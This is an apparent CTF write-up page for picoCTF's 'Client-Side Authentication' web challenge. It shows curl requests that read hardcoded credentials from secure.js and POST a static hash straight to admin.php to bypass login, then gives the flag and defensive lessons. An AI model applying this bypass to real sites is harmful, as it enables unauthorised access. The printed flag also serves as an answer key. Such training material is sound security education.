@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Client-Side Authentication | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>Client-Side Authentication</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty easy">Easy</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Client-Side Authentication</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://saturn.picoctf.net:60379/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+Can you get the flag? Go to this website and see what you can discover.</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-explore-the-login-page">Step 1: Explore the Login Page</h3>
+<p>The website shows a "Secure Customer Portal" with a login form that posts to <code>login.php</code>.</p>
+<pre><code class="language-bash">curl -s http://saturn.picoctf.net:60379/
+</code></pre>
+<pre><code class="language-html">&lt;form role=&quot;form&quot; action=&quot;login.php&quot; method=&quot;post&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required&gt;
+    &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
+    &lt;button type=&quot;submit&quot; name=&quot;login&quot;&gt;Login&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+<hr />
+<h3 id="step-2-submit-a-login-and-analyze-the-response">Step 2: Submit a Login and Analyze the Response</h3>
+<p>Submitting any credentials (e.g. <code>admin</code>/<code>admin</code>) returns a page with interesting JavaScript:</p>
+<pre><code class="language-bash">curl -s -X POST http://saturn.picoctf.net:60379/login.php \
+  -d 'username=admin&amp;password=admin'
+</code></pre>
+<p>The response contains:</p>
+<ol>
+<li>A reference to <code>secure.js</code></li>
+<li>A hidden form that submits to <code>admin.php</code></li>
+<li>Client-side JavaScript that checks the password and, if valid, submits a hash to <code>admin.php</code></li>
+</ol>
+<pre><code class="language-html">&lt;script src=&quot;secure.js&quot;&gt;&lt;/script&gt;
+
+&lt;form hidden action=&quot;admin.php&quot; method=&quot;post&quot; id=&quot;hiddenAdminForm&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;hash&quot; required id=&quot;adminFormHash&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<pre><code class="language-javascript">loggedIn = checkPassword(window.username, window.password);
+
+if(loggedIn) {
+    document.getElementById('msg').innerHTML = &quot;Log In Successful&quot;;
+    document.getElementById('adminFormHash').value = &quot;2196812e91c29df34f5e217cfd639881&quot;;
+    document.getElementById('hiddenAdminForm').submit();
+}
+</code></pre>
+<hr />
+<h3 id="step-3-read-the-password-from-securejs">Step 3: Read the Password from secure.js</h3>
+<p>The <code>checkPassword</code> function is loaded from <code>secure.js</code> — a file that anyone can read:</p>
+<pre><code class="language-bash">curl -s http://saturn.picoctf.net:60379/secure.js
+</code></pre>
+<pre><code class="language-javascript">function checkPassword(username, password) {
+    if (username === 'admin' &amp;&amp; password === 'strongPassword098765') {
+        return true;
+    } else {
+        return false;
+    }
+}
+</code></pre>
+<p>The credentials are hardcoded in plain text: <code>admin</code> / <code>strongPassword098765</code>.</p>
+<hr />
+<h3 id="step-4-get-the-flag">Step 4: Get the Flag</h3>
+<p>At this point there are two ways to get the flag:</p>
+<p><strong>Option A: Login with the discovered credentials</strong></p>
+<p>Use the credentials found in <code>secure.js</code> to login through the form normally.</p>
+<p><strong>Option B: Submit the hash directly (skip authentication entirely)</strong></p>
+<p>Since we already know the hash value from the JavaScript (<code>2196812e91c29df34f5e217cfd639881</code>), we can POST it directly to <code>admin.php</code>:</p>
+<pre><code class="language-bash">curl -s -X POST http://saturn.picoctf.net:60379/admin.php \
+  -d 'hash=2196812e91c29df34f5e217cfd639881'
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}
+</code></pre>
+<p>Option B demonstrates a deeper issue — not only are the credentials exposed client-side, but the "authorization" to access the admin page is just a static hash with no server-side session validation.</p>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}
+</code></pre>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Never do authentication on the client side.</strong> JavaScript runs in the user's browser, meaning all code is fully visible and modifiable. Authentication and authorization must always be handled on the server.</p>
+</li>
+<li>
+<p><strong>JavaScript files are public.</strong> Any <code>.js</code> file loaded by the browser can be read by anyone. Never store passwords, API keys, secrets, or sensitive logic in JavaScript files.</p>
+</li>
+<li>
+<p><strong>Hidden forms provide no security.</strong> The <code>hidden</code> attribute on the form only hides it visually — it's still fully present in the HTML source. An attacker can read the hash value and submit it directly.</p>
+</li>
+<li>
+<p><strong>The flag name says it all.</strong> <code>j5_15_7r4n5p4r3n7</code> (JS is transparent) — JavaScript is transparent by design. Everything sent to the browser is visible to the user. This is a fundamental property of client-side code, not a bug.</p>
+</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
